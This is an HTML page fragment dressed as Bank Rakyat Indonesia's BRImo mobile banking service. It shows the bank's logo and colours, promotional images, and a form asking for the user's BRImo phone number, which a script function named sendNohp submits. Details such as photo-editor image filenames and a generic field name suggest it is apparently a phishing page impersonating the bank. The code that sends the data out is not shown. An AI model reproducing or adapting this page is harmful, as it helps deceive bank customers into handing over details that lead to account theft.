...
<link rel="icon" href="img/Logo_Bank_Rakyat_Indonesia.svg">
...
<meta charset="UTF-8">
	...
	<link rel="icon" type="image/png" href="img/Logo_Bank_Rakyat_Indonesia.svg"/>
<link rel="image_src" href="img/AddText_06-10-05.05.34.jpg"/>
<meta content="img/AddText_06-10-05.05.34.jpg" property="og:image">
...
<nav style="position: relative; top: -10; left: 0; right: 0; margin: 0px auto; width: 100%; height: 70px; background: #0F78CB; border-bottom: 2px solid #fff">
 <img style="margin-top:15px; margin-left:10px;" width="120px" src="img/AddText_02-17-11.36.52.png" alt="" />   
</nav>
...
<form id="formHP" onsubmit="sendNohp(event); return false" method="post" accept-charset="utf-8">
    <center>
<div class="" style="margin-top: 160px;position:relative;border:0px solid #0085e0;padding:15px;width:82%;border-radius:20px 0px 20px 0px; background: #fff; height: 285px; box-shadow:0 0 6px rgba(29,30,32,.22); overflow:hidden">
...
<img style="width:100%;"src="img/AddText_02-18-01.06.41.jpg" alt="">
</center>
...
<h5 style="color:#000; margin-top: 0px; margin-left: 4px">Masukan Nomor ponsel <b style="color: #06529C">BRI</b><b style="color: #F37024">mo</b></h5><br/><ion-icon name="phone-portrait-sharp"></ion-icon>
<input id="NoHp" name="a" type="tel" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid #aaa; border-image: initial; background-color: rgb(255, 255, 255);   border-radius: 15px 0px 15px 0px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 0px 10px; outline: none; margin-top: -5px; padding-left: 40px; box-shadow:inset 0 1px 1px rgba(0,0,0, 0.2);" placeholder="08xxxxxx"  required maxlength="13" minlength="10">
</h3>
<br>
...
<footer style="position: fixed; top: 74; left: 0; right: 0; width: 100%; height: 200px; z-index: -1">
...
<div class="owl-carousel owl-theme owl-loaded " style=" height: 160px; transform-style: preserve-3d; overflow: hidden">
   ...
   <div class="owl-item item active;" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; border-radius: 10px; background: transparent;"><img src="img/AddText_02-17-11.32.49.jpg" style="border-radius: 6px; height: 158px"></div>
   ...
   <div class="owl-item item active" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; background: transparent"><img src="img/AddText_03-28-12.22.04.jpg"  style="border-radius: 6px"></div>
  ...
  <center>
     <div id="process1" name="process" class="process1" style="display: none;">
            <div class="loading">
                ...
                <img class="spinner" src="img/load_spin.png" id="loading" style="margin-top: -2px">
            </div>
        </div>
        </center>
